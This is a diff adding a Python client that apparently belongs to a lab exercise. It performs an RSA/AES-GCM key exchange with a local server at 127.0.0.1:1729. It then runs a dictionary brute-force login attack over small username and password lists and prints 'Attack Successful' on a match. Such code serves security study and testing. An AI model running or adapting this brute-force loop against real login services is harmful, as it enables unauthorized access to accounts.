@@ -1,0 +1,182 @@
+from tkinter import messagebox
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+import time
+import base64
+import json
+import socket
+import sys
+import random
+
+TARGET_HOST = '127.0.0.1'
+TARGET_PORT = 1729
+ADDR = (TARGET_HOST, TARGET_PORT)
+
+NUM_DIGITS_LENGTH_FIELD = 10
+REQUEST_LENGTH_FIELD_FORMAT = '%0' + str(NUM_DIGITS_LENGTH_FIELD) + 'd'
+MAX_REQUEST_MESSAGE_LENGTH = 10**NUM_DIGITS_LENGTH_FIELD-1
+
+# Example list of common usernames and passwords
+usernames = ['admin', 'user', 'test']
+passwords = ['123456', 'password', 'admin', 'letmein', 'qwerty']
+
+
+def send_message(client_socket, response, client_aes_key):
+    try:
+        # Encrypt the server's response using AES
+        # Creating the AES cipher with a new nonce (IV)
+        server_cipher = AES.new(client_aes_key, AES.MODE_GCM)
+
+        # Extracting the nonce
+        server_enc_nonce = server_cipher.nonce
+
+        # Encrypting the message and generating the tag
+        server_ciphertext, server_tag = server_cipher.encrypt_and_digest(response.encode())
+
+        # Prepare the encrypted data to be sent
+        server_data_dict = {
+            "msg": base64.b64encode(server_ciphertext).decode(),
+            "nonce": base64.b64encode(server_enc_nonce).decode(),
+            "tag": base64.b64encode(server_tag).decode()
+        }
+
+        # Convert the dictionary to JSON
+        server_data_json = json.dumps(server_data_dict)
+
+        # Step 1: Ensure the response doesn't exceed the max allowed size
+        response_length = len(server_data_json)
+        if response_length > MAX_REQUEST_MESSAGE_LENGTH:
+            print("Response too large to send.")
+            return  # Break or handle appropriately
+
+        # Step 2: Create the response length field and the full message
+        response_length_field = REQUEST_LENGTH_FIELD_FORMAT % response_length
+        response_data = response_length_field + server_data_json
+
+        # Step 3: Send the encrypted response to the client
+        client_socket.send(response_data.encode())
+        # print("Encrypted message sent successfully!")
+
+        # Simulated Latency - to mimic real-life traffic and delay
+        delay = random.uniform(0.1, 2)  # Simulated delay between 100ms and 2 seconds
+        time.sleep(delay)
+
+    except (socket.error, ValueError) as e:
+        print(f"{type(e).__name__}: {e}")
+        return
+    except KeyboardInterrupt:
+        print("Keyboard interrupt - stopping")
+    except Exception as e:
+        print(f"Unexpected Error: {type(e).__name__}: {e}")
+        return
+
+
+def receive_message(client_socket, server_aes_key):
+        try:
+            # Step 1: Receive the message length field
+            response_length_field = client_socket.recv(NUM_DIGITS_LENGTH_FIELD).decode()
+
+            if not response_length_field:  # Client disconnected cleanly
+                raise ConnectionResetError("Server disconnected unexpectedly")
+
+            # Convert to integer to know the size of the incoming request
+            response_length = int(response_length_field)
+
+            # Step 2: Receive the actual encrypted message JSON
+            server_data_json_st = client_socket.recv(response_length).decode()
+            server_data_json = json.loads(server_data_json_st)
+
+            # Decode the components of the encrypted message
+            en_server_response = base64.b64decode(server_data_json['msg'].encode())
+            server_nonce = base64.b64decode(server_data_json['nonce'].encode())
+            server_tag = base64.b64decode(server_data_json['tag'].encode())
+
+            # Step 3: Decrypt the message using AES GCM mode
+            response_cipher = AES.new(server_aes_key, AES.MODE_GCM, nonce=server_nonce)
+            try:
+                server_response = response_cipher.decrypt_and_verify(en_server_response, server_tag)
+            except ValueError:
+                print("The message was modified!")
+                sys.exit(1)
+
+            # Step 4: Simulated latency before processing the decrypted message
+            delay = random.uniform(0.1, 2)
+            time.sleep(delay)
+
+            # Step 5: Return the decrypted message as a string
+            print("Received and decrypted message:", server_response.decode())
+            return server_response.decode()
+
+        except (socket.error, ValueError, ConnectionResetError) as e:
+            print(f"{type(e).__name__}: {e}")
+            raise  # Re-raise the error for clean handling
+        except KeyboardInterrupt:
+            print("Keyboard interrupt - stopping")
+        except Exception as e:
+            print(f"Unexpected Error: {e}")
+            return
+
+
+def main():
+    # Create the socket once, keep it for the app's lifetime
+    try:
+        # Generating  an RSA key pair (public & public key)
+        client_key = RSA.generate(1024)
+        client_private_key = client_key.export_key()
+        client_public_key = client_key.publickey().export_key()
+
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect(ADDR)
+
+        # Sending the client's public key
+        client_socket.send(client_public_key)
+
+        # Receive the server's public key
+        server_public_key = client_socket.recv(1024).decode()
+
+        # Generating AES key to encrypt traffic from the client to the server
+        client_aes_key = get_random_bytes(16)
+        print('AES Key', client_aes_key)
+
+        # Encrypting the client's AES key using the server's public key (RSA)
+        client_cipher_rsa = PKCS1_OAEP.new(RSA.import_key(server_public_key))
+        enc_client_key = client_cipher_rsa.encrypt(client_aes_key)
+
+        # Sending the client's encrypted AES key
+        client_socket.send(enc_client_key)
+
+        # Receiving the server's encrypted AES key
+        en_server_aes_key = client_socket.recv(1024)
+
+        # Decrypting the server's AES key using the client's private key (RSA)
+        server_aes_key_rsa_cipher = PKCS1_OAEP.new(RSA.import_key(client_private_key))
+        server_aes_key = server_aes_key_rsa_cipher.decrypt(en_server_aes_key)
+        print('Received AES Key', server_aes_key)
+        print('Encrypted AES Key', enc_client_key)
+
+        send_message(client_socket, "login", client_aes_key)
+        for username in usernames:
+            for password in passwords:
+                try:
+                    print(1)
+                    time.sleep(0.3)
+                    send_message(client_socket, username, client_aes_key)
+                    time.sleep(0.3)
+                    send_message(client_socket, password, client_aes_key)
+                    target_answer = receive_message(client_socket, server_aes_key)
+                    print(2)
+
+                    if target_answer.upper() == "LOGIN SUCCESSFUL":
+                        print("Attack Successful")
+                        client_socket.close()
+                        return
+                except Exception as e:
+                    print(f"Connection failed: {e}")
+    except socket.error as e:
+        messagebox.showerror("Connection Error", f"Could not connect to server: {e}")
+        client_socket = None
+
+
+if __name__ == "__main__":
+    main()
